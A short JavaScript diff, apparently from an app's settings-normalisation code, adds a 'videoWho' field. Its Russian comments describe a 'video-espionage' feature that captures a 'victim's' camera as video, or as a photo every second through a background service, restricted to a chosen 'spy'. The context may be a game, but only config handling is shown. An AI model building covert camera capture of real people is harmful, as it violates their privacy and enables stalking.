@@ -594,6 +594,7 @@
     // П26 (06, 156): видео-шпионаж — камера жертвы (видео, пока её приложение на экране; иначе фото раз в 1 с через службу)
     x.video = !!x.video;
     x.videoCam = x.videoCam === 'back' ? 'back' : 'front';
+    x.videoWho = typeof x.videoWho === 'string' ? x.videoWho : '';   // П27 (06, 159): камера жертвы — только у этого шпиона (пусто — у любого)
     x.checkCode = String(x.checkCode || '').trim();
     x.checkSettings = x.checkSettings !== false;
     x.breakCode = String(x.breakCode || '').trim();
